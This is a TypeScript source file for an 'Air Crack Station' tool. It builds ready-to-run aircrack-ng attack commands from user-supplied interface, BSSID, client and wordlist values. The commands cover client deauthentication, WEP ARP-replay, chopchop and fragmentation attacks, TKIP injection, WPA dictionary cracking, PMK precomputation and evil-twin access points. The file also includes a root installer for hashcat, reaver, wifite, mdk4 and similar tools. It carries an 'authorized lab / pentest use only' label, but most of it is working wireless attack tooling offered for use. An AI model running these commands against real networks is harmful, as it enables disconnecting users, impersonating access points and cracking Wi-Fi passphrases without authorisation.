export type ToolCat =
  | "monitor"
  | "capture"
  | "inject"
  | "crack"
  | "ap"
  | "crypto"
  | "util";

export type SuiteTool = {
  id: string;
  bin: string;
  name: string;
  cat: ToolCat;
  blurb: string;
  usage: string;
  build: (s: {
    iface: string;
    monIface: string;
    channel: string;
    bssid: string;
    essid: string;
    client: string;
    capFile: string;
    wordlist: string;
    band: string;
  }) => string;
};

const q = (v: string, fallback: string) => (v.trim() ? v.trim() : fallback);

export const SUITE: SuiteTool[] = [
  {
    id: "airmon",
    bin: "airmon-ng",
    name: "airmon-ng",
    cat: "monitor",
    blurb: "Enable/disable monitor mode. Kills processes that would break injection.",
    usage: "airmon-ng [check kill] [start|stop] <iface>",
    build: (s) =>
      `airmon-ng check kill\nairmon-ng start ${q(s.iface, "wlan0")}\n# restore later:\n# airmon-ng stop ${q(s.monIface, "wlan0mon")}`,
  },
  {
    id: "airodump",
    bin: "airodump-ng",
    name: "airodump-ng",
    cat: "capture",
    blurb: "Scan APs/clients or lock a BSSID/channel and write a capture.",
    usage: "airodump-ng [options] <mon iface>",
    build: (s) => {
      const mon = q(s.monIface, "wlan0mon");
      if (s.bssid.trim()) {
        return `airodump-ng -c ${q(s.channel, "6")} --bssid ${s.bssid.trim()} -w ${q(s.capFile, "handshake").replace(/\.cap$/i, "")} ${mon}`;
      }
      return `airodump-ng --band ${s.band === "abg" ? "abg" : "bg"} ${mon}`;
    },
  },
  {
    id: "aireplay-deauth",
    bin: "aireplay-ng",
    name: "aireplay-ng deauth",
    cat: "inject",
    blurb: "Deauthenticate a client (or broadcast) to force a WPA handshake.",
    usage: "aireplay-ng --deauth <count> -a <AP> [-c <client>] <mon>",
    build: (s) => {
      const ap = q(s.bssid, "AP_BSSID");
      const mon = q(s.monIface, "wlan0mon");
      if (s.client.trim()) {
        return `aireplay-ng --deauth 5 -a ${ap} -c ${s.client.trim()} ${mon}`;
      }
      return `aireplay-ng --deauth 8 -a ${ap} ${mon}`;
    },
  },
  {
    id: "aireplay-fakeauth",
    bin: "aireplay-ng",
    name: "aireplay-ng fakeauth",
    cat: "inject",
    blurb: "Fake authenticate with an AP (needed for many WEP attacks).",
    usage: "aireplay-ng --fakeauth 0 -a <AP> -h <our MAC> <mon>",
    build: (s) =>
      `aireplay-ng --fakeauth 0 -a ${q(s.bssid, "AP_BSSID")} -h $(macchanger -s ${q(s.monIface, "wlan0mon")} | awk '/Permanent|Current/{print $3; exit}') ${q(s.monIface, "wlan0mon")}`,
  },
  {
    id: "aireplay-arp",
    bin: "aireplay-ng",
    name: "aireplay-ng ARP replay",
    cat: "inject",
    blurb: "Standard WEP ARP-request replay to generate IVs fast.",
    usage: "aireplay-ng --arpreplay -b <AP> -h <client> <mon>",
    build: (s) =>
      `aireplay-ng --arpreplay -b ${q(s.bssid, "AP_BSSID")} -h ${q(s.client, "CLIENT_MAC")} ${q(s.monIface, "wlan0mon")}`,
  },
  {
    id: "aireplay-chopchop",
    bin: "aireplay-ng",
    name: "aireplay-ng chopchop",
    cat: "inject",
    blurb: "Decrypt a WEP packet without the key (chopchop).",
    usage: "aireplay-ng --chopchop -b <AP> -h <client> <mon>",
    build: (s) =>
      `aireplay-ng --chopchop -b ${q(s.bssid, "AP_BSSID")} -h ${q(s.client, "CLIENT_MAC")} ${q(s.monIface, "wlan0mon")}`,
  },
  {
    id: "aireplay-frag",
    bin: "aireplay-ng",
    name: "aireplay-ng fragmentation",
    cat: "inject",
    blurb: "Obtain a PRGA keystream from a WEP AP via fragmentation.",
    usage: "aireplay-ng --fragment -b <AP> -h <client> <mon>",
    build: (s) =>
      `aireplay-ng --fragment -b ${q(s.bssid, "AP_BSSID")} -h ${q(s.client, "CLIENT_MAC")} ${q(s.monIface, "wlan0mon")}`,
  },
  {
    id: "aireplay-caffe",
    bin: "aireplay-ng",
    name: "aireplay-ng caffe-latte",
    cat: "inject",
    blurb: "Caffe-Latte: harvest WEP IVs from a client with no AP.",
    usage: "aireplay-ng --caffe-latte -b <AP> <mon>",
    build: (s) =>
      `aireplay-ng --caffe-latte -b ${q(s.bssid, "AP_BSSID")} ${q(s.monIface, "wlan0mon")}`,
  },
  {
    id: "aireplay-interactive",
    bin: "aireplay-ng",
    name: "aireplay-ng interactive",
    cat: "inject",
    blurb: "Pick a packet from the air and replay it.",
    usage: "aireplay-ng --interactive -b <AP> -p 0841 ${mon}",
    build: (s) =>
      `aireplay-ng --interactive -b ${q(s.bssid, "AP_BSSID")} -p 0841 ${q(s.monIface, "wlan0mon")}`,
  },
  {
    id: "aircrack-wpa",
    bin: "aircrack-ng",
    name: "aircrack-ng WPA",
    cat: "crack",
    blurb: "Dictionary attack a WPA/WPA2 handshake in a .cap.",
    usage: "aircrack-ng -w <wordlist> -b <AP> <cap>",
    build: (s) => {
      const cap = q(s.capFile, "handshake.cap");
      const b = s.bssid.trim() ? ` -b ${s.bssid.trim()}` : "";
      return `aircrack-ng -w ${q(s.wordlist, "/usr/share/wordlists/rockyou.txt")}${b} ${cap}`;
    },
  },
  {
    id: "aircrack-wep",
    bin: "aircrack-ng",
    name: "aircrack-ng WEP",
    cat: "crack",
    blurb: "Statistical PTW/Korek crack of WEP from IVs.",
    usage: "aircrack-ng -b <AP> <ivs/cap>",
    build: (s) =>
      `aircrack-ng -b ${q(s.bssid, "AP_BSSID")} ${q(s.capFile, "wep.cap")}`,
  },
  {
    id: "airbase",
    bin: "airbase-ng",
    name: "airbase-ng",
    cat: "ap",
    blurb: "Software AP / evil twin / karma. Pairs with at0 + DHCP.",
    usage: "airbase-ng -a <BSSID> -e <ESSID> -c <ch> <mon>",
    build: (s) =>
      `airbase-ng -a ${q(s.bssid, "00:11:22:33:44:55")} -e '${q(s.essid, "FreeWiFi")}' -c ${q(s.channel, "6")} ${q(s.monIface, "wlan0mon")}`,
  },
  {
    id: "airdecap",
    bin: "airdecap-ng",
    name: "airdecap-ng",
    cat: "crypto",
    blurb: "Decrypt a WEP/WPA capture once you have the key.",
    usage: "airdecap-ng -e <ESSID> -p <passphrase> <cap>",
    build: (s) =>
      `airdecap-ng -e '${q(s.essid, "ESSID")}' -p 'PASSPHRASE' ${q(s.capFile, "handshake.cap")}`,
  },
  {
    id: "airdecloak",
    bin: "airdecloak-ng",
    name: "airdecloak-ng",
    cat: "crypto",
    blurb: "Remove WEP cloaking from a pcap.",
    usage: "airdecloak-ng -i <cap>",
    build: (s) => `airdecloak-ng -i ${q(s.capFile, "cloaked.cap")}`,
  },
  {
    id: "airdrop",
    bin: "airdrop-ng",
    name: "airdrop-ng",
    cat: "inject",
    blurb: "Rule-based deauth from an airodump CSV (targeted kicks).",
    usage: "airdrop-ng -i <mon> -r rules.txt -t <airodump.csv>",
    build: (s) =>
      `airdrop-ng -i ${q(s.monIface, "wlan0mon")} -r rules.txt -t ${q(s.capFile, "scan").replace(/\.cap$/i, "")}-01.csv`,
  },
  {
    id: "airgraph",
    bin: "airgraph-ng",
    name: "airgraph-ng",
    cat: "util",
    blurb: "Graph clients/APs from an airodump CSV (CAPR / CPG).",
    usage: "airgraph-ng -i <csv> -o out.png -g CAPR",
    build: (s) =>
      `airgraph-ng -i ${q(s.capFile, "scan").replace(/\.cap$/i, "")}-01.csv -o graph.png -g CAPR`,
  },
  {
    id: "airolib",
    bin: "airolib-ng",
    name: "airolib-ng",
    cat: "crack",
    blurb: "Precompute PMKs for an ESSID, then feed aircrack-ng.",
    usage: "airolib-ng <db> --import essid|passwd ... --batch",
    build: (s) =>
      `airolib-ng pmk.db --import essid <(echo '${q(s.essid, "ESSID")}')\nairolib-ng pmk.db --import passwd ${q(s.wordlist, "/usr/share/wordlists/rockyou.txt")}\nairolib-ng pmk.db --clean all\nairolib-ng pmk.db --batch\naircrack-ng -r pmk.db ${q(s.capFile, "handshake.cap")}`,
  },
  {
    id: "airserv",
    bin: "airserv-ng",
    name: "airserv-ng",
    cat: "util",
    blurb: "TCP server that exports a wireless card to remote aircrack tools.",
    usage: "airserv-ng -d <iface> -p 666",
    build: (s) => `airserv-ng -d ${q(s.monIface, "wlan0mon")} -p 666`,
  },
  {
    id: "airtun",
    bin: "airtun-ng",
    name: "airtun-ng",
    cat: "ap",
    blurb: "Virtual tunnel into a WEP/WPA network (at0) after you have the key.",
    usage: "airtun-ng -a <AP> -w <wepkey> <mon>",
    build: (s) =>
      `airtun-ng -a ${q(s.bssid, "AP_BSSID")} -e '${q(s.essid, "ESSID")}' ${q(s.monIface, "wlan0mon")}`,
  },
  {
    id: "airvent",
    bin: "airventriloquist-ng",
    name: "airventriloquist-ng",
    cat: "inject",
    blurb: "Inject into encrypted traffic (WEP/WPA) — DHCP/DNS tricks.",
    usage: "airventriloquist-ng -i <mon> -d <target> ...",
    build: (s) =>
      `airventriloquist-ng -i ${q(s.monIface, "wlan0mon")} -d ${q(s.client, "CLIENT_MAC")}`,
  },
  {
    id: "besside",
    bin: "besside-ng",
    name: "besside-ng",
    cat: "crack",
    blurb: "Auto WEP crack + WPA handshake grabber. Very aggressive.",
    usage: "besside-ng [-b <AP>] <mon>",
    build: (s) => {
      const b = s.bssid.trim() ? `-b ${s.bssid.trim()} ` : "";
      return `besside-ng ${b}${q(s.monIface, "wlan0mon")}`;
    },
  },
  {
    id: "easside",
    bin: "easside-ng",
    name: "easside-ng",
    cat: "crack",
    blurb: "WEP without a key via buddy-ng (injection + remote helper).",
    usage: "easside-ng -i <mon> -b <AP> -s <buddy ip>",
    build: (s) =>
      `# on helper:\nbuddy-ng\n# on attack box:\neasside-ng -i ${q(s.monIface, "wlan0mon")} -b ${q(s.bssid, "AP_BSSID")} -s BUDDY_IP`,
  },
  {
    id: "tkiptun",
    bin: "tkiptun-ng",
    name: "tkiptun-ng",
    cat: "inject",
    blurb: "WPA TKIP (Michael) QoS exploit — only on old TKIP APs.",
    usage: "tkiptun-ng -a <AP> -h <client> <mon>",
    build: (s) =>
      `tkiptun-ng -a ${q(s.bssid, "AP_BSSID")} -h ${q(s.client, "CLIENT_MAC")} ${q(s.monIface, "wlan0mon")}`,
  },
  {
    id: "wesside",
    bin: "wesside-ng",
    name: "wesside-ng",
    cat: "crack",
    blurb: "Automated WEP cracker (PTW). One-shot against an open-auth WEP AP.",
    usage: "wesside-ng -i <mon> [-n <BSSID>]",
    build: (s) => {
      const n = s.bssid.trim() ? ` -n ${s.bssid.trim()}` : "";
      return `wesside-ng -i ${q(s.monIface, "wlan0mon")}${n}`;
    },
  },
  {
    id: "wpaclean",
    bin: "wpaclean",
    name: "wpaclean",
    cat: "util",
    blurb: "Strip a capture down to WPA handshakes only.",
    usage: "wpaclean <out.cap> <in.cap>",
    build: (s) =>
      `wpaclean handshake-clean.cap ${q(s.capFile, "handshake.cap")}`,
  },
  {
    id: "ivstools",
    bin: "ivstools",
    name: "ivstools",
    cat: "util",
    blurb: "Extract and merge WEP .ivs files.",
    usage: "ivstools --convert <pcap> <ivs> | --merge a.ivs b.ivs out.ivs",
    build: (s) =>
      `ivstools --convert ${q(s.capFile, "wep.cap")} wep.ivs`,
  },
  {
    id: "makeivs",
    bin: "makeivs-ng",
    name: "makeivs-ng",
    cat: "util",
    blurb: "Generate a fake IV file from a known WEP key (tests).",
    usage: "makeivs-ng -k <key> -o test.ivs",
    build: () => `makeivs-ng -k AABBCCDDEE -o test.ivs -s 10000`,
  },
  {
    id: "packetforge",
    bin: "packetforge-ng",
    name: "packetforge-ng",
    cat: "inject",
    blurb: "Forge ARP/UDP/ICMP packets from a xor keystream (WEP).",
    usage: "packetforge-ng -0 -a <AP> -h <src> -k <dst> -y fragment.xor -w arp.cap",
    build: (s) =>
      `packetforge-ng -0 -a ${q(s.bssid, "AP_BSSID")} -h ${q(s.client, "SRC_MAC")} -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp-forged.cap`,
  },
  {
    id: "buddy",
    bin: "buddy-ng",
    name: "buddy-ng",
    cat: "util",
    blurb: "Helper daemon for easside-ng (run on a second box).",
    usage: "buddy-ng",
    build: () => `buddy-ng`,
  },
  {
    id: "kstats",
    bin: "kstats",
    name: "kstats",
    cat: "util",
    blurb: "Korek statistical debug for WEP IVs.",
    usage: "kstats <ivs>",
    build: () => `kstats wep.ivs`,
  },
];

export const INSTALL_PACKAGES = [
  "aircrack-ng",
  "hashcat",
  "hcxdumptool",
  "hcxtools",
  "wifite",
  "bully",
  "reaver",
  "pixiewps",
  "macchanger",
  "john",
  "crunch",
  "cowpatty",
  "rfkill",
  "iw",
  "wireless-tools",
  "pciutils",
  "usbutils",
  "ethtool",
  "mdk4",
  "hostapd",
  "dnsmasq",
  "lighttpd",
];

export function stationInstallScript(): string {
  return `#!/usr/bin/env bash
# ACS — Air Crack Station installer
# Made by Pakun & iinze0
# Authorized lab / pentest use only
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "run as root: sudo bash $0"; exit 1; }
export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install -y ${INSTALL_PACKAGES.join(" ")}
# wordlists
if [[ ! -f /usr/share/wordlists/rockyou.txt && -f /usr/share/wordlists/rockyou.txt.gz ]]; then
  gunzip -k /usr/share/wordlists/rockyou.txt.gz || true
fi
echo
echo "[+] ACS station packages installed"
echo "    binaries:"
for b in airmon-ng airodump-ng aireplay-ng aircrack-ng airbase-ng airdecap-ng airdecloak-ng airdrop-ng airgraph-ng airolib-ng airserv-ng airtun-ng airventriloquist-ng besside-ng easside-ng tkiptun-ng wesside-ng wpaclean ivstools makeivs-ng packetforge-ng buddy-ng kstats hashcat hcxdumptool wifite; do
  if command -v "$b" >/dev/null 2>&1; then printf "    OK   %s\\n" "$b"
  else printf "    MISS %s\\n" "$b"
  fi
done
echo
echo "[+] run:  sudo acs    (if installed)  or  sudo bash acs.sh"
`;
}

export function autoMonitorScript(iface: string): string {
  const i = iface.trim() || "wlan0";
  return `#!/usr/bin/env bash
# ACS auto monitor mode
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "root required"; exit 1; }
IFACE="${i}"
if [[ "$IFACE" == *mon ]]; then
  echo "[*] already a monitor iface: $IFACE"
  iw dev "$IFACE" info || true
  exit 0
fi
rfkill unblock wifi 2>/dev/null || true
rfkill unblock all 2>/dev/null || true
airmon-ng check kill
airmon-ng start "$IFACE"
sleep 1
MON=""
if iw dev 2>/dev/null | grep -q "interface ${i}mon"; then MON="${i}mon"
elif [[ -d /sys/class/net/${i}mon ]]; then MON="${i}mon"
else
  MON=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep mon | head -n1 || true)
fi
[[ -z "$MON" ]] && MON="${i}mon"
echo "[+] monitor iface: $MON"
iwconfig "$MON" 2>/dev/null || iw dev "$MON" info
echo
echo "Restore later:"
echo "  airmon-ng stop $MON"
echo "  systemctl start NetworkManager"
`;
}

export function restoreScript(mon: string): string {
  const m = mon.trim() || "wlan0mon";
  return `airmon-ng stop ${m}
systemctl start NetworkManager 2>/dev/null || service NetworkManager start
nmcli radio wifi on 2>/dev/null || true
`;
}
